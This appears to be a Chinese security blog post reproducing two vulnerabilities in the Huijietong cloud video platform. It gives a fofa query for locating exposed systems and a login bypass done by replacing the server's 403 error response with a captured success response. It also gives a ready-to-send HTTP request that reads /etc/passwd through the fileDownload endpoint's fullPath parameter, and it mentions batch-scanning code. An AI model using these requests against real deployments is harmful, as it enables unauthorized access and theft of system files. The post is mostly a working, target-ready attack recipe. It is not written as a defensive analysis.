一.漏洞背景 

   

        会捷通云视讯2个漏洞 1 管理登入绕过 2任意文件读取


漏洞复现

祭出fofa大法，fofa语法如下

body="/him/api/rest/v1.0/node/role"title="基础平台管理系统"

1 登陆存在逻辑漏洞可以通过修改返回包直接登陆

     需要满足条件 需要知道正确返回包（正确返回包获得方式还是因为弱口令）不得不说弱口令yyds啊 

正确返回包如下

HTTP/1.1 200 Date: Thu, 25 Mar 2021 13:53:45 GMTAccept-Ranges: bytesServer: Restlet-Framework/2.1.1Vary: Accept-Charset, Accept-Encoding, Accept-Language, AcceptContent-Type: application/json;charset=UTF-8Connection: closeContent-Length: 28
{"token":null,"result":null}


密码不正确返回包

HTTP/1.1 403 X-Frame-Options: SAMEORIGINX-Content-Type-Options: nosniffX-XSS-Protection: 1; mode=blockDate: Tue, 18 May 2021 14:03:35 GMTAccept-Ranges: bytesServer: Restlet-Framework/2.1.1Vary: Accept-Charset, Accept-Encoding, Accept-Language, AcceptContent-Type: application/json;charset=UTF-8Connection: closeContent-Length: 61
{"errorCode":2000,"errorInfo":"invalid.username.or.password"}

我们修改错误返回包 为正确的返回包

 点击forward 然后放包，ok登陆成功

测试了功能还算正常



2.任意文件读取

漏洞位置

/fileDownload?action=downloadBackupFile

通过fullPath=可以修改实现任意文件读取

POST /fileDownload?action=downloadBackupFile HTTP/1.1Host: xxx.xxx.xxx.xxxCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Accept: */*Connection: closeContent-Length: 20
fullPath=/etc/passwd



批量检测批量检测关键代码 

    其实headers里面只需要包含这个参数叫好了 但是为了还是做个模拟浏览器登陆好点 故此加入了

     User-Agent：     Content-Type: application/x-www-form-urlencoded
